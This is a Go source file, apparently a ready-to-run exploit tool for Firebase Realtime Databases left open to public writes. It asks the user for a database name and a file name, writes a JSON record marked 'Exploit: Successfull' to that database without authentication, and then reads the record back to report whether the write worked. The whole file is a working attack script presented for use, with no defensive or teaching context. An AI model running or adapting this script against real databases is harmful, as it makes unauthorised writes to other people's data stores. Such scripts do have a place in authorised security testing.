package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
)

func main() {
	// Give Data
	fmt.Println("[+] Input Data for exploit\n")
	var site, file, name, email, website, message string

	fmt.Print("[+] Enter firebase Database Name: ")
	fmt.Scanln(&site)
	fmt.Print("[+] Enter filename: ")
	fmt.Scanln(&file)
	fmt.Print("[+] Enter name: ")
	fmt.Scanln(&name)
	fmt.Print("[+] Enter email: ")
	fmt.Scanln(&email)
	fmt.Print("[+] Enter Website: ")
	fmt.Scanln(&website)
	fmt.Print("[+] Enter A Message: ")
	fmt.Scanln(&message)

	// Payload
	siteURL := "https://" + site + ".firebaseio.com/" + file + ".json"
	data := map[string]string{
		"Exploit": "Successfull",
		"website": website,
		"email":   email,
		"name":    name,
		"message": message,
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error marshaling JSON:", err)
		return
	}

	resp, err := http.Post(siteURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error sending request:", err)
		return
	}
	defer resp.Body.Close()

	// Collecting file
	if resp.StatusCode == 200 {
		fmt.Println("[*] Exploited")
		fmt.Printf("File Created: https://%s.firebaseio.com/%s.json\n", site, file)
	} else {
		fmt.Println("[*] Not Exploited")
		fmt.Println("No File Created")
	}

	fmt.Println("If you get a response 'Permission Denied' with 'Successfully Exploited', this shows Exploit is written but can't be read.")
	fmt.Println("Verify by visiting the URL\n")
	fmt.Println("[+] Response\n")

	r, err := http.Get(siteURL)
	if err != nil {
		fmt.Println("Error getting response:", err)
		return
	}
	defer r.Body.Close()

	var responseData map[string]interface{}
	if err := json.NewDecoder(r.Body).Decode(&responseData); err != nil {
		fmt.Println("Error decoding response JSON:", err)
		return
	}

	// Reasoning
	if resp.StatusCode == 200 {
		fmt.Println("[âˆš] Successfully Exploited")
	} else if resp.StatusCode == 401 {
		fmt.Println("[x] Not Exploitable")
		fmt.Println("[!] Reason: All Permissions Denied")
	} else if resp.StatusCode == 404 {
		fmt.Println("[x] Database Not Found")
		fmt.Println("[!] Reason: Firebase Database Not Found")
	} else {
		fmt.Println("[x] Unknown Error")
		fmt.Println("[!] Reason: Unknown Error")
	}
}
